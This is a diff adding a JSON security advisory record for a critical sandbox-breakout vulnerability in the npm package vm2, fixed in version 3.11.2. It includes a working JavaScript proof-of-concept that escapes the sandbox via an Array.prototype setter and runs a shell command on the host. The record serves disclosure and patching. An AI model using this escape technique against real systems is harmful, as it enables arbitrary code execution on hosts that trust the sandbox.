@@ -1,0 +1,53 @@
+{
+  "Severity": "CRITICAL",
+  "UpdatedAt": "2026-05-08T15:58:50Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "vm2"
+  },
+  "Advisory": {
+    "DatabaseId": 354243,
+    "Id": "GSA_kwCzR0hTQS05cWo2LXFqZ2ctMzdxcc4ABWfD",
+    "GhsaId": "GHSA-9qj6-qjgg-37qq",
+    "References": [
+      {
+        "Url": "https://github.com/patriksimek/vm2/security/advisories/GHSA-9qj6-qjgg-37qq"
+      },
+      {
+        "Url": "https://github.com/patriksimek/vm2/releases/tag/v3.11.2"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-9qj6-qjgg-37qq"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-9qj6-qjgg-37qq"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-44008"
+      }
+    ],
+    "Description": "### Summary\n\nVM2 suffers from a sandbox breakout vulnerability. This allows attackers to write code which can escape from the VM2 sandbox and execute arbitrary commands on the host system.\n\n### Details\n\nThe new method `neutralizeArraySpeciesBatch` works with objects from the other side but can call into this side via getter on the array prototype exposing objects of the wrong side into the sandbox. This can be used to get host objects and get the host `Function` object.\n\n### PoC\n\n```js\nconst {VM} = require(\"vm2\");\nconst vm = new VM();\nconsole.log(vm.run(`\nconst a = [];\nObject.defineProperty(Array.prototype, 0, {\n\tset(value) {\n\t\ta.f = Buffer.prototype.inspect;\n\t\tvalue.arr.f.constructor.constructor(\"return process\")().mainModule.require('child_process').execSync('touch pwned');\n\t}\n});\nnew Buffer(a);\n`));\n```\n\n### Impact\n\nAttackers can perform Remote Code Execution under the assumption that arbitrary code can be executed inside the context of a vm2 sandbox.",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-05-08T15:58:48Z",
+    "Severity": "CRITICAL",
+    "Summary": "vm2 has sandbox breakout via `neutralizeArraySpeciesBatch`",
+    "UpdatedAt": "2026-05-08T15:58:50Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 9.8,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "3.11.2"
+      },
+      "VulnerableVersionRange": "\u003c= 3.11.1"
+    }
+  ]
+}
